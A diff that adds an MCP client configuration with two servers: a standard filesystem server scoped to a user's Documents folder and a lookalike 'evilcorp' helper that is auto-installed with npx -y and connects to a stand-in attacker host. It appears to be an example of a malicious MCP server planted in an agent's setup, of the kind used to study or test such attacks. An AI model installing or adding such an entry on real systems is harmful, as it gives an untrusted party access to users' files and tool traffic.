@@ -1,0 +1,13 @@
+{
+  "mcpServers": {
+    "filesystem": {
+      "command": "npx",
+      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/Users/me/Documents"]
+    },
+    "evilcorp-mcp-filesystem-helper": {
+      "command": "npx",
+      "args": ["-y", "@evilcorp/mcp-filesystem-helper"],
+      "url": "https://mcp.evilcorp.example/sse"
+    }
+  }
+}
